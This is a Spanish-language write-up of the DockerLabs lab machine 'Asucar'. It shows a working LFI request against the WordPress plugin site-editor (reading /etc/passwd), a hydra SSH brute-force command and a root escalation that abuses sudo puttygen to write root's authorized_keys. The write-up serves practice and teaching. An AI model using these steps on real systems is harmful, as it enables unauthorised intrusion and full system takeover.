---
Estado: Completado
Plataforma: DockerLabs
SO: Linux
Dificultad: Medio
VectorInicial: LFI en plugin vulnerable de WordPress (`site-editor <= 1.1.1`)
Privesc: Sudo NOPASSWD con `puttygen` para escribir `authorized_keys` de root
Fecha: 2026-02-12
---

# Asucar

## Reconocimiento inicial

Se comienza identificando puertos y servicios:

```bash
settarget 172.17.0.2
gomap -s $TARGET
```

Servicios detectados:

- `22/tcp` → SSH
- `80/tcp` → HTTP

## Enumeración web

La página principal se muestra mal maquetada, lo que sugiere un problema de resolución de dominio. Al inspeccionar enlaces y código fuente se identifica el dominio `asucar.dl`, que se añade a `/etc/hosts`.

Después de ajustar la resolución, la web carga correctamente, pero el contenido visible no aporta demasiada información útil, así que se pasa a enumeración con `wpscan`:

```bash
wpscan --url http://asucar.dl -e u,p
```

Hallazgos relevantes:

- usuario: `wordpress`
- plugin vulnerable: `site-editor`
- vulnerabilidad: **LFI** en `site-editor <= 1.1.1`

## Explotación del LFI

El plugin permite leer archivos locales mediante una petición como esta:

```text
http://asucar.dl/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
```

De esta forma se obtiene el contenido de `/etc/passwd`, donde aparece el usuario `curiosito`.

## Acceso inicial por SSH

Con el usuario identificado, se intenta fuerza bruta contra SSH:

```bash
hydra -l curiosito -P /usr/share/wordlists/rockyou.txt 172.17.0.2 -t 5 ssh
```

Credencial obtenida:

- `curiosito:password1`

Se accede por SSH con esas credenciales.

## Escalada de privilegios

Una vez dentro, se revisan permisos sudo:

```bash
sudo -l
```

Salida relevante:

```text
(root) NOPASSWD: /usr/bin/puttygen
```

Aunque `puttygen` no aparece en GTFOBins como vector típico, puede aprovecharse para escribir una clave pública SSH en `/root/.ssh/authorized_keys`.

### Paso 1: generar par de claves

```bash
ssh-keygen -t rsa -b 4096 -f /tmp/asucar -N ""
```

### Paso 2: usar `puttygen` para volcar la pública en root

```bash
sudo puttygen /tmp/asucar -O public-openssh -o /root/.ssh/authorized_keys
```

### Paso 3: acceder como root

```bash
ssh -i /tmp/asucar root@127.0.0.1
```

Con esto se obtiene acceso como `root`.

## Conclusión

La cadena de ataque queda así:

1. Enumeración de WordPress.
2. Explotación de LFI en plugin vulnerable.
3. Descubrimiento del usuario `curiosito`.
4. Fuerza bruta SSH.
5. Escalada a root mediante abuso de `puttygen` en `sudo`.

Buen laboratorio para practicar cómo una vulnerabilidad web relativamente simple puede acabar en compromiso total del sistema si además hay malas credenciales y una configuración sudo negligente.

---
Si te gustó, puedes invitarme a un café.
[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/C0C61UHTB1)
